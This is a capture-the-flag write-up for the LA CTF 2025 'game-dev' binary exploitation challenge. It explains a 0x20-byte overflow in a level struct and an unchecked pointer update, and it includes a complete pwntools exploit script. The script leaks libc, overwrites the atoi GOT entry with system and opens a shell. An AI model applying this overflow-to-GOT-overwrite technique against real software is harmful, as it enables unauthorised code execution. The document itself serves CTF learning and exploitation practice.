# game-dev

## challenge information
LA CTF 2025: [](https://github.com/uclaacm/lactf-archive/tree/main/2025/pwn/gamedev)

## analysis
* checksec
  * `Partial RELRO` is important.
```bash
[~/dc/ctf/la/game-dev] >>>checksec chall
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### vulnerabilities
* 20 bytes BOF
```c
struct Level
{
    struct Level *next[8];
    char data[0x20];
};

void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}
```
![Screenshot_20250213_225241.png](Screenshot_20250213_225241.png)

* no validation when curr is updated.
```c
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}
```

### exploit flow
* overwrite child pointer
* make crr point to stdin, .got
* libc leak from stdin
* got overwrite: `atoi` -> `system`

## exploit
```py
from pwn import *
import sys

e = ELF("chall",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 127.0.0.1 9999"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
    b explore
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : log.info(f"{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

def create(idx:bytes):
    sla(b"Choice: ",b"1")
    sla(b"index: ",idx)

def edit(data:bytes):
    sla(b"Choice: ",b"2")
    sla(b"data: ",data)

def test()->bytes:
    sla(b"Choice: ",b"3")
    ru(b"Level data: ")
    return rl()

def explore(idx:bytes):
    sla(b"Choice: ",b"4")
    sla(b"index: ",idx)

def reset():
    sla(b"Choice: ",b"5")

ru(b"gift: ")
leak = rl().strip()
leak = int(leak,16)
e.address = leak - e.sym["main"]
hlog(e.address)

paybyte(b"A"*32)
add64(0x0)
add64(0x71)
add64(e.got["atoi"]-0x18) #stdin
add64(e.got["atoi"]-0x40) #atoi @ .got

create(b"1")
create(b"2")
create(b"3")
explore(b"1")

create(b"1")
create(b"2")
create(b"3")
explore(b"1")

create(b"1")
create(b"2")
create(b"3")
reset()
explore(b"3")
edit(payload)
reset()
explore(b"1")
explore(b"1")
explore(b"0")
libc_leak = pu64(test()[:8])
hlog(libc_leak)
diff = 0x78728dc1b780 - 0x000078728da00000
libc.address = libc_leak - diff
reset()
explore(b"1")
explore(b"1")
explore(b"1")
pay64(libc.sym["system"])
edit(payload)
sl(b"/bin/ls")
sl(b"/bin/sh")

shell()
```